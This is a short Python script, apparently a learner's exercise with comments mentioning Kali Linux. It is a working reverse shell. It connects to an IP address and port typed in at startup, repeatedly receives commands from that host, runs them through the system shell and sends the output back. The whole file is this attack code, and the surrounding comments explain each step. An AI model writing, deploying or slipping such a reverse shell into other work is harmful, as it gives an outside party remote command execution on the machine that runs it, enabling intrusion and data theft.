#!/usr/env/bin python  

import socket, subprocess 

#Function ----> Return the output of system commands. 
def system_execution(command): 
    return subprocess.check_output(command, shell=True) #This run the system command on the window machine. 

ipv4_address = input("Please input the the the IP address you would like to connect to: ") 
port_number = int(input("enter the port you want to connect to:  "))

#Creating a connection between two computers on the same network. 
#A succesful connection will result in zero data being sent and a succesfull connection being closed  

#Creating an instance of a socket.  
#Ipv4 address 
#socket.SOCKEt stream will expect a port number.
creating_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

#Connecting to the target IP.
creating_connection.connect((ipv4_address, port_number ))  

#Creating a messgae in bytes to send to the computer. 
message =str.encode("---->We have a connection \n\n")  #Encode the string, not doing so results in an expecting Bytes error. 

#Now to you want to send a message to the IP address you connected too.  
creating_connection.send(message) 

#Run command on our system machine and send the result to Kali Linux. 
while True: 
    command = creating_connection.recv(1024)  
    command = command.decode(encoding='utf-8')
    command_result = (system_execution(command)) 
    creating_connection.send(command_result)

#Aftersending the message you want to close the connection.
creating_connection.close() 

